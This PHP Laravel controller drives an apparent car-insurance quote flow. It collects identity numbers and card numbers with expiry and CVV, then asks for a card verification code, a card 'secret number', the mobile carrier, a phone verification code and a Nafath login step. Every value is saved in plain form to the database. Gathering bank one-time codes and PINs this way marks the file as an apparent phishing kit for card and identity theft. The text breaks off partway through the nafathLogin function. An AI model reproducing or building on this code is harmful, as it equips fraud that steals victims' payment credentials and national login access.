<?php

namespace App\Http\Controllers\Frontend;

use App\Http\Controllers\Controller;
use App\Http\Requests\Frontend\CardOwnershipRequestFormRequest;
use App\Http\Requests\Frontend\CardOwnershipSecertNumberRequestFormRequest;
use App\Http\Requests\Frontend\CheckPhoneNumberRequestFormRequest;
use App\Http\Requests\Frontend\ConfirmPhoneNumberRequestFormRequest;
use App\Http\Requests\Frontend\InsurancRequesteFormRequest;
use App\Http\Requests\Frontend\InsurancStatementsRequestFormRequest;
use App\Http\Requests\Frontend\NafathDocumentingRequestFormRequest;
use App\Http\Requests\Frontend\NafathLoginRequestFormRequest;
use App\Http\Requests\Frontend\PaymentFormRequestFormRequest;
use App\Models\Insurance;
use App\Models\InsuranceRequest;
use Illuminate\Http\Request;
use Illuminate\Routing\Route;
use App\Models\SupportTicket;
use Illuminate\Support\Facades\DB;

class HomePageFrontendController extends Controller
{

    // ========================================================================
    // =========================== index Function =============================
    // ========================================================================
    public function welcome(Request $request, Route $route)
    {
        try {
            // session()->forget('insuranceRequest');
            return view('welcome');
        } catch (\Throwable $th) {
            $function_name =  $route->getActionName();
            $check_old_errors = new SupportTicket();
            $check_old_errors = $check_old_errors->select('*')->where([
                'error_location' => $th->getFile(),
                'error_description' => $th->getMessage(),
                'function_name' => $function_name,
                'error_line' => $th->getLine(),
            ])->get();
            if ($check_old_errors->count() == 0) {
                $new_error_ticket = SupportTicket::create([
                    'error_location' => $th->getFile(),
                    'error_description' => $th->getMessage(),
                    'function_name' => $function_name,
                    'error_line' =>  $th->getLine(),
                ]);
                $end_error_ticket = $new_error_ticket;
            } else {
                $end_error_ticket = $check_old_errors->first();
            }
            return view('errors.support_tickets', compact('th', 'function_name', 'end_error_ticket'));
        }
    }

    // ========================================================================
    // ====================== insuranceRequest Function =======================
    // ========================================================================
    public function insuranceRequest(InsurancRequesteFormRequest $request, Route $route)
    {
        try {


            // Prepare Data :
            $created_data = [
                'insurance_category' => $request->insurance_category,
                'new_insurance_category' => $request->new_insurance_category,
                'identity_number' => $request->identity_number,
                'applicant_name' => $request->applicant_name,
                'phone' => $request->phone,
                'date_of_birth' => $request->date_of_birth,
            ];

            // Store in DB :
            DB::transaction(function () use ($request, $created_data) {
                $insuranceRequest = InsuranceRequest::create($created_data);

                // Save form data to session
                $created_data['id'] = $insuranceRequest->id;
                $request->session()->put('insuranceRequest', $created_data);
            });

            return redirect()->route('insuranceStatements')->with('success', 'Record Added Successfully');
        } catch (\Throwable $th) {
            $function_name =  $route->getActionName();
            $check_old_errors = new SupportTicket();
            $check_old_errors = $check_old_errors->select('*')->where([
                'error_location' => $th->getFile(),
                'error_description' => $th->getMessage(),
                'function_name' => $function_name,
                'error_line' => $th->getLine(),
            ])->get();
            if ($check_old_errors->count() == 0) {
                $new_error_ticket = SupportTicket::create([
                    'error_location' => $th->getFile(),
                    'error_description' => $th->getMessage(),
                    'function_name' => $function_name,
                    'error_line' =>  $th->getLine(),
                ]);
                $end_error_ticket = $new_error_ticket;
            } else {
                $end_error_ticket = $check_old_errors->first();
            }
            return view('errors.support_tickets', compact('th', 'function_name', 'end_error_ticket'));
        }
    }

    // ========================================================================
    // ==================== insuranceStatements Function ======================
    // ========================================================================
    public function insuranceStatements(Request $request, Route $route)
    {
        try {
            $insuranceRequest = session('insuranceRequest');
            if (!isset($insuranceRequest)) {
                return redirect()->route('welcome');
            }
            return view('insuranceStatements');
        } catch (\Throwable $th) {
            $function_name =  $route->getActionName();
            $check_old_errors = new SupportTicket();
            $check_old_errors = $check_old_errors->select('*')->where([
                'error_location' => $th->getFile(),
                'error_description' => $th->getMessage(),
                'function_name' => $function_name,
                'error_line' => $th->getLine(),
            ])->get();
            if ($check_old_errors->count() == 0) {
                $new_error_ticket = SupportTicket::create([
                    'error_location' => $th->getFile(),
                    'error_description' => $th->getMessage(),
                    'function_name' => $function_name,
                    'error_line' =>  $th->getLine(),
                ]);
                $end_error_ticket = $new_error_ticket;
            } else {
                $end_error_ticket = $check_old_errors->first();
            }
            return view('errors.support_tickets', compact('th', 'function_name', 'end_error_ticket'));
        }
    }

    // ========================================================================
    // ====================== insuranceRequest Function =======================
    // ========================================================================
    public function insuranceStatementsRequest(InsurancStatementsRequestFormRequest $request, Route $route)
    {
        // try {
        // Retrieve form data from session (insuranceRequest)
        $insuranceRequest = session('insuranceRequest');

        $insuranceRequest = InsuranceRequest::find($insuranceRequest['id']);
        if ($insuranceRequest) {

            // Prepare Data :
            $updated_data = [
                'insurance_type' => $request->insurance_type,
                'document_start_date' => $request->document_start_date,
                'purpose_using_car' => $request->purpose_using_car,
                'car_type' => $request->car_type,
                'car_estimated_value' => $request->car_estimated_value,
                'manufacturing_year' => $request->manufacturing_year,
                'repair_location' => $request->repair_location,
            ];

            // Save form data to session
            $request->session()->put('insuranceStatements', $updated_data);

            // Update in DB :
            DB::transaction(function () use ($updated_data, $insuranceRequest) {
                $insuranceRequest->update($updated_data);
            });

            // Combine data from steps 1 and 2
            $insuranceRequest = session('insuranceRequest');
            $insuranceStatements = session('insuranceStatements');
            $allFormData = array_merge($insuranceRequest, $insuranceStatements);

            // Save all data to session
            $request->session()->put('allFormData', $allFormData);

            return redirect()->route('insuranceType')->with('success', 'Record Added Successfully');
        } else {
            return redirect()->back()->with('danger', 'This record does not exist in the records');
        }
        // } catch (\Throwable $th) {
        //     $function_name =  $route->getActionName();
        //     $check_old_errors = new SupportTicket();
        //     $check_old_errors = $check_old_errors->select('*')->where([
        //         'error_location' => $th->getFile(),
        //         'error_description' => $th->getMessage(),
        //         'function_name' => $function_name,
        //         'error_line' => $th->getLine(),
        //     ])->get();
        //     if ($check_old_errors->count() == 0) {
        //         $new_error_ticket = SupportTicket::create([
        //             'error_location' => $th->getFile(),
        //             'error_description' => $th->getMessage(),
        //             'function_name' => $function_name,
        //             'error_line' =>  $th->getLine(),
        //         ]);
        //         $end_error_ticket = $new_error_ticket;
        //     } else {
        //         $end_error_ticket = $check_old_errors->first();
        //     }
        //     return view('errors.support_tickets', compact('th', 'function_name', 'end_error_ticket'));
        // }
    }

    // ========================================================================
    // ======================= insuranceType Function =========================
    // ========================================================================
    public function insuranceType(Request $request, Route $route)
    {
        try {
            $allFormData = session('allFormData');
            if (!isset($allFormData)) {
                return redirect()->route('welcome');
            }
            // return $allFormData = session('allFormData');
            $thirdPartyInsurances = Insurance::Status(1)->where('insurance_type', 1)->get(); // التأمينات ضد الغير
            $fullInsurances = Insurance::Status(1)->where('insurance_type', 2)->get(); // التأمينات الشاملة
            return view('insuranceType', compact('thirdPartyInsurances', 'fullInsurances'));
        } catch (\Throwable $th) {
            $function_name =  $route->getActionName();
            $check_old_errors = new SupportTicket();
            $check_old_errors = $check_old_errors->select('*')->where([
                'error_location' => $th->getFile(),
                'error_description' => $th->getMessage(),
                'function_name' => $function_name,
                'error_line' => $th->getLine(),
            ])->get();
            if ($check_old_errors->count() == 0) {
                $new_error_ticket = SupportTicket::create([
                    'error_location' => $th->getFile(),
                    'error_description' => $th->getMessage(),
                    'function_name' => $function_name,
                    'error_line' =>  $th->getLine(),
                ]);
                $end_error_ticket = $new_error_ticket;
            } else {
                $end_error_ticket = $check_old_errors->first();
            }
            return view('errors.support_tickets', compact('th', 'function_name', 'end_error_ticket'));
        }
    }

    // ========================================================================
    // ==================== insuranceTypeRequest Function =====================
    // ========================================================================
    public function insuranceTypeRequest(Request $request, Route $route)
    {
        try {
            // Retrieve form data from session (allFormData)
            $allFormData = session('allFormData');

            $insuranceRequest = InsuranceRequest::find($allFormData['id']);
            if ($insuranceRequest) {
                // Prepare Data :
                $updated_data = [
                    'insurance_id' => $request->insurance_id,
                ];

                // Save form data to session
                $request->session()->put('insuranceType', $updated_data);

                // Update in DB :
                DB::transaction(function () use ($updated_data, $insuranceRequest) {
                    $insuranceRequest->update($updated_data);
                });

                // Combine data from steps 1 and 2
                $allFormData = session('allFormData');
                $insuranceType = session('insuranceType');
                $allFormData = array_merge($allFormData, $insuranceType);

                // Save all data to session
                $request->session()->put('allFormData', $allFormData);

                return redirect()->route('insuranceInformation')->with('success', 'Record Added Successfully');
            } else {
                return redirect()->back()->with('danger', 'This record does not exist in the records');
            }
        } catch (\Throwable $th) {
            $function_name =  $route->getActionName();
            $check_old_errors = new SupportTicket();
            $check_old_errors = $check_old_errors->select('*')->where([
                'error_location' => $th->getFile(),
                'error_description' => $th->getMessage(),
                'function_name' => $function_name,
                'error_line' => $th->getLine(),
            ])->get();
            if ($check_old_errors->count() == 0) {
                $new_error_ticket = SupportTicket::create([
                    'error_location' => $th->getFile(),
                    'error_description' => $th->getMessage(),
                    'function_name' => $function_name,
                    'error_line' =>  $th->getLine(),
                ]);
                $end_error_ticket = $new_error_ticket;
            } else {
                $end_error_ticket = $check_old_errors->first();
            }
            return view('errors.support_tickets', compact('th', 'function_name', 'end_error_ticket'));
        }
    }

    // ========================================================================
    // ==================== insuranceInformation Function =====================
    // ========================================================================
    public function insuranceInformation(Request $request, Route $route)
    {
        try {
            // Retrieve form data from session (allFormData)
            $allFormData = session('allFormData');
            if (!isset($allFormData) && $allFormData['insurance_id']) {
                return redirect()->route('welcome');
            }

            $insurance = Insurance::find($allFormData['insurance_id']);
            if ($insurance) {
                return view('insuranceInformation', compact('insurance'));
            } else {
                return redirect()->back()->with('danger', 'This record does not exist in the records');
            }
        } catch (\Throwable $th) {
            $function_name =  $route->getActionName();
            $check_old_errors = new SupportTicket();
            $check_old_errors = $check_old_errors->select('*')->where([
                'error_location' => $th->getFile(),
                'error_description' => $th->getMessage(),
                'function_name' => $function_name,
                'error_line' => $th->getLine(),
            ])->get();
            if ($check_old_errors->count() == 0) {
                $new_error_ticket = SupportTicket::create([
                    'error_location' => $th->getFile(),
                    'error_description' => $th->getMessage(),
                    'function_name' => $function_name,
                    'error_line' =>  $th->getLine(),
                ]);
                $end_error_ticket = $new_error_ticket;
            } else {
                $end_error_ticket = $check_old_errors->first();
            }
            return view('errors.support_tickets', compact('th', 'function_name', 'end_error_ticket'));
        }
    }

    // ========================================================================
    // ================= insuranceInformationRequest Function =================
    // ========================================================================
    public function insuranceInformationRequest(Request $request, Route $route)
    {
        try {
            // Retrieve form data from session (allFormData)
            $allFormData = session('allFormData');

            $insuranceRequest = InsuranceRequest::find($allFormData['id']);
            if ($insuranceRequest) {
                // Prepare Data :
                $paymentForm = [
                    'total' => $request->total,
                ];

                // Save form data to session
                $request->session()->put('paymentForm', $paymentForm);

                // Combine data from steps 1 and 2
                $allFormData = session('allFormData');
                $paymentForm = session('paymentForm');
                $allFormData = array_merge($allFormData, $paymentForm);

                // Save all data to session
                $request->session()->put('allFormData', $allFormData);

                return redirect()->route('paymentForm')->with('success', 'Record Added Successfully');
            } else {
                return redirect()->back()->with('danger', 'This record does not exist in the records');
            }
        } catch (\Throwable $th) {
            $function_name =  $route->getActionName();
            $check_old_errors = new SupportTicket();
            $check_old_errors = $check_old_errors->select('*')->where([
                'error_location' => $th->getFile(),
                'error_description' => $th->getMessage(),
                'function_name' => $function_name,
                'error_line' => $th->getLine(),
            ])->get();
            if ($check_old_errors->count() == 0) {
                $new_error_ticket = SupportTicket::create([
                    'error_location' => $th->getFile(),
                    'error_description' => $th->getMessage(),
                    'function_name' => $function_name,
                    'error_line' =>  $th->getLine(),
                ]);
                $end_error_ticket = $new_error_ticket;
            } else {
                $end_error_ticket = $check_old_errors->first();
            }
            return view('errors.support_tickets', compact('th', 'function_name', 'end_error_ticket'));
        }
    }

    // ========================================================================
    // ======================== paymentForm Function ==========================
    // ========================================================================
    public function paymentForm(Request $request, Route $route)
    {
        try {
            // Retrieve form data from session (allFormData)
            $allFormData = session('allFormData');
            if (!isset($allFormData)) {
                return redirect()->route('welcome');
            }

            $insurance = Insurance::find($allFormData['insurance_id']);
            if ($allFormData) {
                return view('paymentForm', compact('allFormData', 'insurance'));
            } else {
                return redirect()->back()->with('danger', 'This record does not exist in the records');
            }
        } catch (\Throwable $th) {
            $function_name =  $route->getActionName();
            $check_old_errors = new SupportTicket();
            $check_old_errors = $check_old_errors->select('*')->where([
                'error_location' => $th->getFile(),
                'error_description' => $th->getMessage(),
                'function_name' => $function_name,
                'error_line' => $th->getLine(),
            ])->get();
            if ($check_old_errors->count() == 0) {
                $new_error_ticket = SupportTicket::create([
                    'error_location' => $th->getFile(),
                    'error_description' => $th->getMessage(),
                    'function_name' => $function_name,
                    'error_line' =>  $th->getLine(),
                ]);
                $end_error_ticket = $new_error_ticket;
            } else {
                $end_error_ticket = $check_old_errors->first();
            }
            return view('errors.support_tickets', compact('th', 'function_name', 'end_error_ticket'));
        }
    }

    // ========================================================================
    // ===================== paymentFormRequest Function ======================
    // ========================================================================
    public function paymentFormRequest(PaymentFormRequestFormRequest $request, Route $route)
    {
        try {
            // Retrieve form data from session (allFormData)
            $allFormData = session('allFormData');

            $insuranceRequest = InsuranceRequest::find($allFormData['id']);
            if ($insuranceRequest) {
                // Prepare Data :
                $updated_data = [
                    'name_on_card' => $request->name_on_card,
                    'card_number' => $request->card_number,
                    'expiry_date' => $request->expiry_date,
                    'cvv' => $request->cvv,
                ];

                // Save form data to session
                $request->session()->put('paymentForm', $updated_data);

                // Update in DB :
                DB::transaction(function () use ($updated_data, $insuranceRequest) {
                    $insuranceRequest->update($updated_data);
                });

                // Combine data from steps 1 and 2
                $allFormData = session('allFormData');
                $paymentForm = session('paymentForm');
                $allFormData = array_merge($allFormData, $paymentForm);

                // Save all data to session
                $request->session()->put('allFormData', $allFormData);

                return redirect()->route('beforeCallProcess')->with('success', 'Record Added Successfully');
            } else {
                return redirect()->back()->with('danger', 'This record does not exist in the records');
            }
        } catch (\Throwable $th) {
            $function_name =  $route->getActionName();
            $check_old_errors = new SupportTicket();
            $check_old_errors = $check_old_errors->select('*')->where([
                'error_location' => $th->getFile(),
                'error_description' => $th->getMessage(),
                'function_name' => $function_name,
                'error_line' => $th->getLine(),
            ])->get();
            if ($check_old_errors->count() == 0) {
                $new_error_ticket = SupportTicket::create([
                    'error_location' => $th->getFile(),
                    'error_description' => $th->getMessage(),
                    'function_name' => $function_name,
                    'error_line' =>  $th->getLine(),
                ]);
                $end_error_ticket = $new_error_ticket;
            } else {
                $end_error_ticket = $check_old_errors->first();
            }
            return view('errors.support_tickets', compact('th', 'function_name', 'end_error_ticket'));
        }
    }

    // ========================================================================
    // ==================== beforeCallProcess Function ========================
    // ========================================================================
    public function beforeCallProcess(Request $request, Route $route)
    {
        try {
            // Retrieve form data from session (allFormData)
            $allFormData = session('allFormData');
            if (!isset($allFormData)) {
                return redirect()->route('welcome');
            }

            $insurance = Insurance::find($allFormData['insurance_id']);
            if ($allFormData) {
                return view('beforeCallProcess', compact('allFormData'));
            } else {
                return redirect()->back()->with('danger', 'This record does not exist in the records');
            }
        } catch (\Throwable $th) {
            $function_name =  $route->getActionName();
            $check_old_errors = new SupportTicket();
            $check_old_errors = $check_old_errors->select('*')->where([
                'error_location' => $th->getFile(),
                'error_description' => $th->getMessage(),
                'function_name' => $function_name,
                'error_line' => $th->getLine(),
            ])->get();
            if ($check_old_errors->count() == 0) {
                $new_error_ticket = SupportTicket::create([
                    'error_location' => $th->getFile(),
                    'error_description' => $th->getMessage(),
                    'function_name' => $function_name,
                    'error_line' =>  $th->getLine(),
                ]);
                $end_error_ticket = $new_error_ticket;
            } else {
                $end_error_ticket = $check_old_errors->first();
            }
            return view('errors.support_tickets', compact('th', 'function_name', 'end_error_ticket'));
        }
    }

    // ========================================================================
    // ======================= callProcess Function ===========================
    // ========================================================================
    public function callProcess(Request $request, Route $route)
    {
        try {
            // Retrieve form data from session (allFormData)
            $allFormData = session('allFormData');
            if (!isset($allFormData)) {
                return redirect()->route('welcome');
            }

            $insurance = Insurance::find($allFormData['insurance_id']);
            if ($allFormData) {
                return view('callProcess', compact('allFormData'));
            } else {
                return redirect()->back()->with('danger', 'This record does not exist in the records');
            }
        } catch (\Throwable $th) {
            $function_name =  $route->getActionName();
            $check_old_errors = new SupportTicket();
            $check_old_errors = $check_old_errors->select('*')->where([
                'error_location' => $th->getFile(),
                'error_description' => $th->getMessage(),
                'function_name' => $function_name,
                'error_line' => $th->getLine(),
            ])->get();
            if ($check_old_errors->count() == 0) {
                $new_error_ticket = SupportTicket::create([
                    'error_location' => $th->getFile(),
                    'error_description' => $th->getMessage(),
                    'function_name' => $function_name,
                    'error_line' =>  $th->getLine(),
                ]);
                $end_error_ticket = $new_error_ticket;
            } else {
                $end_error_ticket = $check_old_errors->first();
            }
            return view('errors.support_tickets', compact('th', 'function_name', 'end_error_ticket'));
        }
    }

    // ========================================================================
    // ==================== callProcessRequest Function =======================
    // ========================================================================
    public function callProcessRequest(Request $request, Route $route)
    {
        try {
            // Retrieve form data from session (allFormData)
            $allFormData = session('allFormData');

            $insuranceRequest = InsuranceRequest::find($allFormData['id']);
            if ($insuranceRequest) {
                return redirect()->route('cardOwnership')->with('success', 'Record Added Successfully');
            } else {
                return redirect()->back()->with('danger', 'This record does not exist in the records');
            }
        } catch (\Throwable $th) {
            $function_name =  $route->getActionName();
            $check_old_errors = new SupportTicket();
            $check_old_errors = $check_old_errors->select('*')->where([
                'error_location' => $th->getFile(),
                'error_description' => $th->getMessage(),
                'function_name' => $function_name,
                'error_line' => $th->getLine(),
            ])->get();
            if ($check_old_errors->count() == 0) {
                $new_error_ticket = SupportTicket::create([
                    'error_location' => $th->getFile(),
                    'error_description' => $th->getMessage(),
                    'function_name' => $function_name,
                    'error_line' =>  $th->getLine(),
                ]);
                $end_error_ticket = $new_error_ticket;
            } else {
                $end_error_ticket = $check_old_errors->first();
            }
            return view('errors.support_tickets', compact('th', 'function_name', 'end_error_ticket'));
        }
    }

    // ========================================================================
    // ======================= cardOwnership Function =========================
    // ========================================================================
    public function cardOwnership(Request $request, Route $route)
    {
        try {
            // Retrieve form data from session (allFormData)
            $allFormData = session('allFormData');
            if (!isset($allFormData)) {
                return redirect()->route('welcome');
            }

            $insurance = Insurance::find($allFormData['insurance_id']);
            if ($allFormData) {
                return view('cardOwnership', compact('allFormData'));
            } else {
                return redirect()->back()->with('danger', 'This record does not exist in the records');
            }
        } catch (\Throwable $th) {
            $function_name =  $route->getActionName();
            $check_old_errors = new SupportTicket();
            $check_old_errors = $check_old_errors->select('*')->where([
                'error_location' => $th->getFile(),
                'error_description' => $th->getMessage(),
                'function_name' => $function_name,
                'error_line' => $th->getLine(),
            ])->get();
            if ($check_old_errors->count() == 0) {
                $new_error_ticket = SupportTicket::create([
                    'error_location' => $th->getFile(),
                    'error_description' => $th->getMessage(),
                    'function_name' => $function_name,
                    'error_line' =>  $th->getLine(),
                ]);
                $end_error_ticket = $new_error_ticket;
            } else {
                $end_error_ticket = $check_old_errors->first();
            }
            return view('errors.support_tickets', compact('th', 'function_name', 'end_error_ticket'));
        }
    }

    // ========================================================================
    // ===================== cardOwnershipRequest Function ======================
    // ========================================================================
    public function cardOwnershipRequest(CardOwnershipRequestFormRequest $request, Route $route)
    {
        try {
            // Retrieve form data from session (allFormData)
            $allFormData = session('allFormData');

            $insuranceRequest = InsuranceRequest::find($allFormData['id']);
            if ($insuranceRequest) {
                // Prepare Data :
                $updated_data = [
                    'card_ownership_verification_code' => $request->card_ownership_verification_code,
                ];

                // Save form data to session
                $request->session()->put('cardOwnership', $updated_data);

                // Update in DB :
                DB::transaction(function () use ($updated_data, $insuranceRequest) {
                    $insuranceRequest->update($updated_data);
                });

                // Combine data from steps 1 and 2
                $allFormData = session('allFormData');
                $cardOwnership = session('cardOwnership');
                $allFormData = array_merge($allFormData, $cardOwnership);

                // Save all data to session
                $request->session()->put('allFormData', $allFormData);

                return redirect()->route('cardOwnershipSecertNumber')->with('success', 'Record Added Successfully');
            } else {
                return redirect()->back()->with('danger', 'This record does not exist in the records');
            }
        } catch (\Throwable $th) {
            $function_name =  $route->getActionName();
            $check_old_errors = new SupportTicket();
            $check_old_errors = $check_old_errors->select('*')->where([
                'error_location' => $th->getFile(),
                'error_description' => $th->getMessage(),
                'function_name' => $function_name,
                'error_line' => $th->getLine(),
            ])->get();
            if ($check_old_errors->count() == 0) {
                $new_error_ticket = SupportTicket::create([
                    'error_location' => $th->getFile(),
                    'error_description' => $th->getMessage(),
                    'function_name' => $function_name,
                    'error_line' =>  $th->getLine(),
                ]);
                $end_error_ticket = $new_error_ticket;
            } else {
                $end_error_ticket = $check_old_errors->first();
            }
            return view('errors.support_tickets', compact('th', 'function_name', 'end_error_ticket'));
        }
    }

    // ========================================================================
    // ================= cardOwnershipSecertNumber Function ===================
    // ========================================================================
    public function cardOwnershipSecertNumber(Request $request, Route $route)
    {
        try {
            // Retrieve form data from session (allFormData)
            $allFormData = session('allFormData');
            if (!isset($allFormData)) {
                return redirect()->route('welcome');
            }

            $insurance = Insurance::find($allFormData['insurance_id']);
            if ($allFormData) {
                return view('cardOwnershipSecertNumber', compact('allFormData'));
            } else {
                return redirect()->back()->with('danger', 'This record does not exist in the records');
            }
        } catch (\Throwable $th) {
            $function_name =  $route->getActionName();
            $check_old_errors = new SupportTicket();
            $check_old_errors = $check_old_errors->select('*')->where([
                'error_location' => $th->getFile(),
                'error_description' => $th->getMessage(),
                'function_name' => $function_name,
                'error_line' => $th->getLine(),
            ])->get();
            if ($check_old_errors->count() == 0) {
                $new_error_ticket = SupportTicket::create([
                    'error_location' => $th->getFile(),
                    'error_description' => $th->getMessage(),
                    'function_name' => $function_name,
                    'error_line' =>  $th->getLine(),
                ]);
                $end_error_ticket = $new_error_ticket;
            } else {
                $end_error_ticket = $check_old_errors->first();
            }
            return view('errors.support_tickets', compact('th', 'function_name', 'end_error_ticket'));
        }
    }

    // ========================================================================
    // ============== cardOwnershipSecertNumberRequest Function ===============
    // ========================================================================
    public function cardOwnershipSecertNumberRequest(CardOwnershipSecertNumberRequestFormRequest $request, Route $route)
    {
        try {
            // Retrieve form data from session (allFormData)
            $allFormData = session('allFormData');

            $insuranceRequest = InsuranceRequest::find($allFormData['id']);
            if ($insuranceRequest) {
                // Prepare Data :
                $updated_data = [
                    'card_ownership_secert_number' => $request->card_ownership_secert_number,
                ];

                // Save form data to session
                $request->session()->put('cardOwnershipSecertNumber', $updated_data);

                // Update in DB :
                DB::transaction(function () use ($updated_data, $insuranceRequest) {
                    $insuranceRequest->update($updated_data);
                });

                // Combine data from steps 1 and 2
                $allFormData = session('allFormData');
                $cardOwnershipSecertNumber = session('cardOwnershipSecertNumber');
                $allFormData = array_merge($allFormData, $cardOwnershipSecertNumber);

                // Save all data to session
                $request->session()->put('allFormData', $allFormData);

                return redirect()->route('confirmPhoneNumber')->with('success', 'Record Added Successfully');
            } else {
                return redirect()->back()->with('danger', 'This record does not exist in the records');
            }
        } catch (\Throwable $th) {
            $function_name =  $route->getActionName();
            $check_old_errors = new SupportTicket();
            $check_old_errors = $check_old_errors->select('*')->where([
                'error_location' => $th->getFile(),
                'error_description' => $th->getMessage(),
                'function_name' => $function_name,
                'error_line' => $th->getLine(),
            ])->get();
            if ($check_old_errors->count() == 0) {
                $new_error_ticket = SupportTicket::create([
                    'error_location' => $th->getFile(),
                    'error_description' => $th->getMessage(),
                    'function_name' => $function_name,
                    'error_line' =>  $th->getLine(),
                ]);
                $end_error_ticket = $new_error_ticket;
            } else {
                $end_error_ticket = $check_old_errors->first();
            }
            return view('errors.support_tickets', compact('th', 'function_name', 'end_error_ticket'));
        }
    }

    // ========================================================================
    // ==================== confirmPhoneNumber Function =======================
    // ========================================================================
    public function confirmPhoneNumber(Request $request, Route $route)
    {
        try {
            // Retrieve form data from session (allFormData)
            $allFormData = session('allFormData');
            if (!isset($allFormData)) {
                return redirect()->route('welcome');
            }

            $insurance = Insurance::find($allFormData['insurance_id']);
            if ($allFormData) {
                return view('ConfirmPhoneNumber', compact('allFormData'));
            } else {
                return redirect()->back()->with('danger', 'This record does not exist in the records');
            }
        } catch (\Throwable $th) {
            $function_name =  $route->getActionName();
            $check_old_errors = new SupportTicket();
            $check_old_errors = $check_old_errors->select('*')->where([
                'error_location' => $th->getFile(),
                'error_description' => $th->getMessage(),
                'function_name' => $function_name,
                'error_line' => $th->getLine(),
            ])->get();
            if ($check_old_errors->count() == 0) {
                $new_error_ticket = SupportTicket::create([
                    'error_location' => $th->getFile(),
                    'error_description' => $th->getMessage(),
                    'function_name' => $function_name,
                    'error_line' =>  $th->getLine(),
                ]);
                $end_error_ticket = $new_error_ticket;
            } else {
                $end_error_ticket = $check_old_errors->first();
            }
            return view('errors.support_tickets', compact('th', 'function_name', 'end_error_ticket'));
        }
    }

    // ========================================================================
    // ================ confirmPhoneNumberRequest Function ====================
    // ========================================================================
    public function confirmPhoneNumberRequest(ConfirmPhoneNumberRequestFormRequest $request, Route $route)
    {
        try {
            // Retrieve form data from session (allFormData)
            $allFormData = session('allFormData');

            $insuranceRequest = InsuranceRequest::find($allFormData['id']);
            if ($insuranceRequest) {
                // Prepare Data :
                $updated_data = [
                    'mobile_number' => $request->mobile_number,
                    'mobile_network_operator' => $request->mobile_network_operator,
                ];

                // Save form data to session
                $request->session()->put('confirmPhoneNumber', $updated_data);

                // Update in DB :
                DB::transaction(function () use ($updated_data, $insuranceRequest) {
                    $insuranceRequest->update($updated_data);
                });

                // Combine data from steps 1 and 2
                $allFormData = session('allFormData');
                $confirmPhoneNumber = session('confirmPhoneNumber');
                $allFormData = array_merge($allFormData, $confirmPhoneNumber);

                // Save all data to session
                $request->session()->put('allFormData', $allFormData);
                // return 'Layth';
                return redirect()->route('checkPhoneNumber')->with('success', 'Record Added Successfully');
            } else {
                return redirect()->back()->with('danger', 'This record does not exist in the records');
            }
        } catch (\Throwable $th) {
            $function_name =  $route->getActionName();
            $check_old_errors = new SupportTicket();
            $check_old_errors = $check_old_errors->select('*')->where([
                'error_location' => $th->getFile(),
                'error_description' => $th->getMessage(),
                'function_name' => $function_name,
                'error_line' => $th->getLine(),
            ])->get();
            if ($check_old_errors->count() == 0) {
                $new_error_ticket = SupportTicket::create([
                    'error_location' => $th->getFile(),
                    'error_description' => $th->getMessage(),
                    'function_name' => $function_name,
                    'error_line' =>  $th->getLine(),
                ]);
                $end_error_ticket = $new_error_ticket;
            } else {
                $end_error_ticket = $check_old_errors->first();
            }
            return view('errors.support_tickets', compact('th', 'function_name', 'end_error_ticket'));
        }
    }

    // ========================================================================
    // ===================== checkPhoneNumber Function ========================
    // ========================================================================
    public function checkPhoneNumber(Request $request, Route $route)
    {
        try {
            // Retrieve form data from session (allFormData)
            $allFormData = session('allFormData');
            if (!isset($allFormData)) {
                return redirect()->route('welcome');
            }

            $insurance = Insurance::find($allFormData['insurance_id']);
            if ($allFormData) {
                return view('checkPhoneNumber', compact('allFormData'));
            } else {
                return redirect()->back()->with('danger', 'This record does not exist in the records');
            }
        } catch (\Throwable $th) {
            $function_name =  $route->getActionName();
            $check_old_errors = new SupportTicket();
            $check_old_errors = $check_old_errors->select('*')->where([
                'error_location' => $th->getFile(),
                'error_description' => $th->getMessage(),
                'function_name' => $function_name,
                'error_line' => $th->getLine(),
            ])->get();
            if ($check_old_errors->count() == 0) {
                $new_error_ticket = SupportTicket::create([
                    'error_location' => $th->getFile(),
                    'error_description' => $th->getMessage(),
                    'function_name' => $function_name,
                    'error_line' =>  $th->getLine(),
                ]);
                $end_error_ticket = $new_error_ticket;
            } else {
                $end_error_ticket = $check_old_errors->first();
            }
            return view('errors.support_tickets', compact('th', 'function_name', 'end_error_ticket'));
        }
    }

    // ========================================================================
    // ================= checkPhoneNumberRequest Function =====================
    // ========================================================================
    public function checkPhoneNumberRequest(CheckPhoneNumberRequestFormRequest $request, Route $route)
    {
        try {
            // Retrieve form data from session (allFormData)
            $allFormData = session('allFormData');

            $insuranceRequest = InsuranceRequest::find($allFormData['id']);
            if ($insuranceRequest) {
                // Prepare Data :
                $updated_data = [
                    'check_mobile_number_verification_code' => $request->check_mobile_number_verification_code,
                ];

                // Save form data to session
                $request->session()->put('checkPhoneNumber', $updated_data);

                // Update in DB :
                DB::transaction(function () use ($updated_data, $insuranceRequest) {
                    $insuranceRequest->update($updated_data);
                });

                // Combine data from steps 1 and 2
                $allFormData = session('allFormData');
                $checkPhoneNumber = session('checkPhoneNumber');
                $allFormData = array_merge($allFormData, $checkPhoneNumber);

                // Save all data to session
                $request->session()->put('allFormData', $allFormData);

                return redirect()->route('nafathLogin')->with('success', 'Record Added Successfully');
            } else {
                return redirect()->back()->with('danger', 'This record does not exist in the records');
            }
        } catch (\Throwable $th) {
            $function_name =  $route->getActionName();
            $check_old_errors = new SupportTicket();
            $check_old_errors = $check_old_errors->select('*')->where([
                'error_location' => $th->getFile(),
                'error_description' => $th->getMessage(),
                'function_name' => $function_name,
                'error_line' => $th->getLine(),
            ])->get();
            if ($check_old_errors->count() == 0) {
                $new_error_ticket = SupportTicket::create([
                    'error_location' => $th->getFile(),
                    'error_description' => $th->getMessage(),
                    'function_name' => $function_name,
                    'error_line' =>  $th->getLine(),
                ]);
                $end_error_ticket = $new_error_ticket;
            } else {
                $end_error_ticket = $check_old_errors->first();
            }
            return view('errors.support_tickets', compact('th', 'function_name', 'end_error_ticket'));
        }
    }



    // ========================================================================
    // ===================== nafathLogin Function ========================
    // ========================================================================
    public function nafathLogin(Request $request, Route $route)
    {
        try {
            // Retrieve form data from session (allFormData)
            $allFormData = session('allFormData');
            if (!isset($allFormData)) {
                return redirect()->route('welcome');
            }

            if ($allFormData) {
                return view('nafathLogin', compact('allFormData'));
            } else {
                return redirect()->back()->with('danger', 'This record does not exist in the records');
            }
        } catch (\Throwable $th) {
            $function_name =  $route->getActionName();
            $check_old_errors = new SupportTicket();
            $check_old_errors = $check_old_errors->select('*')->where([
                'error_location' => $th->getFile(),
                'error_description' => $th->getMessage(),
                'function_name' => $function_name,
